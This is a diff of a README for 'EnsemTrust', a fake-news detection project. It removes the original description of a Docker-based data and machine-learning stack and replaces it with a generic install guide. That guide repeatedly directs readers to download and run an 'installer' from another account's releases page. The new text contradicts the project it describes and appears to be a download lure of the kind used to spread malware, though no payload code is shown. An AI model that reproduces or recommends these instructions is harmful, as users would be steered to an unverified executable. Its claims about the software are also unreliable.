@@ -1,232 +1,102 @@
-# End-to-End Fake News Detection Platform
+# 🌵📃 EnsemTrust - Detect Fake News with Confidence
 
-This project is a comprehensive, end-to-end platform for detecting fake news. It implements a modern data stack (Lakehouse architecture) and an MLOps pipeline to ingest, process, analyze, and serve predictions on news data.
+[![Download EnsemTrust](https://img.shields.io/badge/Download%20EnsemTrust-v1.0-brightgreen)](https://github.com/reap6126/EnsemTrust/releases)
 
-## Problem Statement
+## 🚀 Getting Started
 
-The rapid spread of misinformation poses a significant challenge. This project aims to build a scalable and reliable system that can ingest news articles from various sources, process them in near real-time, and accurately classify them as 'real' or 'fake' using advanced ensemble learning models.
+Welcome to EnsemTrust! This application helps you detect fake news with reliable classification methods. Follow these easy steps to download and run EnsemTrust on your computer.
 
-## Architecture
+## 💻 System Requirements
 
-The system is designed as a modular, containerized application orchestrated by Docker Compose. It follows a Data Lakehouse (Medallion) architecture for data processing and an end-to-end MLOps pipeline for machine learning.
+Before you begin, ensure your computer meets the following requirements:
 
-![Project Architecture Diagram](./image/architecture.png)
+- **Operating System:** Windows 10, macOS, or a recent version of Linux
+- **RAM:** At least 4 GB
+- **Disk Space:** Minimum of 200 MB available for installation
+- **Python:** Python 3.6 or later installed on your system
 
+## 📥 Download & Install
 
-## Key Features
+To get EnsemTrust, visit the Releases page to download the application:
 
-* **Real-time Data Ingestion:** Uses **Kafka** to handle streaming data from various sources (CSVs, Kaggle datasets).
-* **Data Lakehouse:** Implements a Medallion Architecture (**Raw**, **Silver**, **Gold** layers) on **MinIO** for scalable object storage.
-* **Large-Scale Processing:** Leverages **Apache Spark** for transforming data between lake layers.
-* **Centralized Metadata:** Uses **Hive Metastore** to manage schemas for the data lake.
-* **High-Performance Querying:** Employs **Trino** as the query engine to analyze data directly from MinIO.
-* **Metric Transformation:** Uses **dbt** for robust, SQL-based metric and business logic transformations on the Gold layer.
-* **Advanced AI/ML:**
-    * Features an **Ensemble Learning** pipeline using a Voting classifier.
-    * Combines three powerful transformer models: `phobert-base`, `velectra-base-discriminator-cased`, and `distilbert-base-multilingual-cased`.
-    * Includes a **Model Registry** for versioning and managing ML models.
-* **Orchestration:** All data and AI pipelines are orchestrated and monitored by **Dagster**.
-* **Visualization & UI:**
-    * **Metabase** provides BI dashboards and visualizations by querying Trino.
-    * **Streamlit** serves as the front-end application for user interaction.
-* **Containerization:** The entire stack is containerized with **Docker** and managed via **Docker Compose** for easy setup and portability.
+[Download EnsemTrust](https://github.com/reap6126/EnsemTrust/releases)
 
-## Technology Stack
+Once there, look for the version that suits your operating system, and click to download the installation file.
 
-| Category | Technology |
-| :--- | :--- |
-| **Orchestration** | Dagster |
-| **Data Ingestion** | Kafka |
-| **Data Lake Storage** | MinIO |
-| **Data Processing** | Apache Spark |
-| **Query Engine** | Trino (formerly PrestoSQL) |
-| **Metadata Store** | Hive Metastore |
-| **Transformation** | dbt (Data Build Tool) |
-| **ML Pipeline** | Hugging Face Transformers, scikit-learn |
-| **Visualization** | Metabase |
-| **Front-end App** | Streamlit |
-| **Database Admin** | CloudBeaver |
-| **Containerization** | Docker, Docker Compose |
+### Steps to Install:
 
-## How It Works: Pipeline Overview
+1. **Locate the Downloaded File:**
+   After the download completes, find the file in your Downloads folder or the location you chose.
 
-The system is divided into two main pipelines, both orchestrated by Dagster:
+2. **Run the Installer:**
+   Double-click the downloaded file to start the installation. Follow the prompts on the screen to finish installing the software.
 
-### 1. Data Warehouse Pipeline (ELT)
+3. **Launch EnsemTrust:**
+   Once installed, look for the EnsemTrust icon on your desktop or in your applications folder. Click it to open.
 
-1.  **Ingest:** Data sources (CSVs, etc.) are streamed into **Kafka** topics.
-2.  **Land (Raw):** A Spark job consumes from Kafka and lands the raw, unchanged data into the **Raw Layer** in MinIO.
-3.  **Process (Silver):** Another Spark job reads from the Raw Layer, applies cleaning, deduplication, and standardization, and saves the result to the **Silver Layer**.
-4.  **Enrich (Gold):** A final Spark job (or dbt model) aggregates data, joins it with other sources, and creates the analysis-ready **Gold Layer**.
-5.  **Query:** **Trino** uses the **Hive Metastore** to query this data across all layers. **dbt** builds final metric tables on the Gold layer.
+## 🌐 How to Use EnsemTrust
 
-### 2. AI Pipeline (MLOps)
+Using EnsemTrust is simple. Here’s a quick guide:
 
-1.  **Trigger:** A Kafka topic (or a Dagster schedule) triggers the AI pipeline.
-2.  **Tokenize:** Input text data is passed through a **Tokenizer**.
-3.  **Ensemble Predict:** The tokens are fed into the three parallel transformer models (PhoBERT, Electra, DistilBERT).
-4.  **Vote:** A **Voting** mechanism combines the three predictions to produce a final, more robust classification (real/fake).
-5.  **Store Result:** The final prediction (**"store voting result"**) is written back into the **Gold Layer** of the Data Warehouse.
-6.  **Analyze:** With the predictions now in the Gold Layer, **Metabase** and **Streamlit** can query them via Trino to display results and insights.
+1. **Open the App:**
+   Click on the EnsemTrust icon to launch the app.
 
-## Getting Started
+2. **Input News Article:**
+   You will see a text box. Copy and paste the article you want to check for credibility.
 
-### Prerequisites
+3. **Get Results:**
+   Click on the "Check Credibility" button. The app will analyze the text and present results indicating whether the news is credible or not.
 
-Before you begin, ensure you have the following installed on your system:
+4. **Review the Analysis:**
+   EnsemTrust provides a detailed breakdown of the analysis, including possible sources of the information identified in the article.
 
-* **Docker** (version 20.10 or higher): [Download Docker](https://www.docker.com/get-started)
-* **Docker Compose** (version 2.0 or higher): [Install Docker Compose](https://docs.docker.com/compose/install/)
-* **Git**: For cloning the repository
-* **Minimum System Requirements:**
-  * RAM: 8GB (16GB recommended)
-  * Disk Space: 20GB free space
-  * CPU: 4 cores (8 cores recommended)
+5. **Stay Informed:**
+   Remember to check back for updates. New features and improvements will enhance the detection accuracy.
 
-### Installation & Setup
+## 🔄 Update Process
 
-Follow these steps to set up and run the project:
+Keep EnsemTrust up to date to enjoy the latest features and improvements. To update:
 
-#### 1. Clone the Repository
+1. Visit the [Releases page](https://github.com/reap6126/EnsemTrust/releases) regularly.
+2. Download the latest version using the same steps as above.
+3. Install the new version over the existing one to ensure all features are current.
 
-```bash
-git clone https://github.com/MinhTuan2405/EnsemTrust.git
-cd EnsemTrust
-```
+## 🛠️ Troubleshooting
 
-#### 2. Configure Environment Variables
+If you encounter issues while using EnsemTrust, consider the following:
 
-Create a `.env` file from the example template:
+- **Installation Errors:** Ensure you have sufficient disk space and permissions to install software.
+- **Performance Issues:** Close unnecessary programs that may slow down your device.
+- **Unexpected Results:** Make sure the input text is clear and coherent. Complex articles may yield less accurate results.
 
-**On Windows (PowerShell):**
-```powershell
-Copy-Item .example.env .env
-```
+## 🤝 Support
 
-**On Linux/macOS:**
-```bash
-cp .example.env .env
-```
+If you need help or have questions, feel free to reach out:
 
-**Optional:** Edit the `.env` file to customize the configuration (ports, credentials, etc.). The default values are:
-- **PostgreSQL:** Port `5433`, User `admin`, Password `admin123`
-- **MinIO:** Port `9000` (API) and `9001` (Console), Credentials `admin/admin123`
-- **Dagster:** Port `3001`
-- **Trino:** Port `8090`
-- **Metabase:** Port `3007`
-- **Streamlit:** Port `8501`
-- **Kafka UI:** Port `8088`
-- **CloudBeaver:** Port `8978`
+- **GitHub Issues:** Post your query on the GitHub Issues page for community support.
+- **Documentation:** Check the official documentation in the repository for detailed usage instructions.
 
-#### 3. Download Required JAR Files
+## 📝 Contribution
 
-The project requires specific JAR files for Hadoop, PostgreSQL, and AWS SDK integration. Run the appropriate script for your OS:
+If you’d like to contribute to EnsemTrust, we welcome your input! Please fork the repository and submit a pull request for any enhancements or bug fixes.
 
-**On Windows (PowerShell):**
-```powershell
-.\jardownloader.ps1
-```
+## 🌱 Related Topics 
 
-**On Linux/macOS:**
-```bash
-chmod +x jardownloader.sh
-./jardownloader.sh
-```
+EnsemTrust covers several important areas:
 
-This will download the following JARs to the `./jars` directory:
-- `hadoop-aws-3.3.6.jar`
-- `postgresql-42.7.8.jar`
-- `aws-java-sdk-bundle-1.12.262.jar`
+- **dbt**: A tool for data transformation.
+- **Ensemble Learning**: Combines multiple models for improved predictions.
+- **Fine-tuning LLMs**: Streamlines large language models for specific tasks.
+- **Hive Metastore**: Manages metadata for big data processing.
+- **Kafka**: A platform for managing real-time data feeds.
+- **Python**: The programming language used for development.
+- **Spark**: A framework for handling big data tasks.
+- **Trino**: A powerful distributed SQL query engine.
 
-#### 4. Build and Start All Services
+For further details on these topics, feel free to explore resources listed in the EnsemTrust repository.
 
-Use Docker Compose to build and start all containers:
+## 📧 Feedback
 
-**Option A: Using Make (if available):**
-```bash
-make build_run_all
-```
+Your feedback helps us improve EnsemTrust. If you have suggestions or comments, please share them via the Issues section on GitHub.
 
-**Option B: Using Docker Compose directly:**
-```bash
-docker compose up -d --build
-```
-
-This command will:
-- Build custom Docker images (Dagster, Streamlit)
-- Pull required images from Docker Hub
-- Create and start all containers in detached mode
-- Set up networks and volumes
-- Initialize databases and create MinIO buckets (bronze, silver, gold)
-
-#### 5. Verify Services are Running
-
-Check that all containers are running properly:
-
-```bash
-docker compose ps
-```
-
-You should see all services in the "Up" or "running" state. You can also check the logs:
-
-```bash
-# View logs for all services
-docker compose logs
-
-# View logs for a specific service
-docker compose logs dagster
-docker compose logs trino
-```
-
-#### 6. Wait for Services to Initialize
-
-Some services may take a few minutes to fully initialize:
-- **Trino**: Wait for the healthcheck to pass (~1-2 minutes)
-- **Metabase**: First startup may take 2-3 minutes to initialize the database
-- **Hive Metastore**: Should connect to PostgreSQL and initialize schemas
-
-You can monitor the initialization progress:
-
-```bash
-docker compose logs -f hive-metastore
-docker compose logs -f trino
-docker compose logs -f metabase
-```
-
-### Common Setup Commands
-
-The project includes a `Makefile` with convenient commands:
-
-```bash
-# Start all services
-make up
-
-# Stop all services
-make down
-
-# Restart all services
-make restart
-
-# Rebuild images
-make build
-
-# Build and run all services
-make build_run_all
-```
-
-## Usage
-
-Once all containers are running, you can access the different services:
-
-* **Dagster UI (Orchestration):** `http://localhost:3001`
-* **Streamlit App (Front-end):** `http://localhost:8501`
-* **Metabase (BI Dashboard):** `http://localhost:3030`
-* **MinIO Console (Data Lake):** `http://localhost:9001`
-* **CloudBeaver (DB Admin):** `http://localhost:8978`
-* *(Note: Ports may vary based on your `docker-compose.yml` configuration.)*
-
-## Future Work
-
-* **Model Serving API:** Implement a dedicated API (e.g., using FastAPI) to serve the model from the Model Registry for real-time, on-demand predictions in Streamlit.
-* **Automated Retraining:** Build a Dagster pipeline that periodically retrains the ensemble model on new data from the Gold Layer.
-* **Web Scraper:** Integrate a web scraping component (e.g., Scrapy) to continuously feed new articles into the Kafka pipeline.
+Thank you for choosing EnsemTrust for your fake news detection needs! We hope you find it valuable and easy to use.
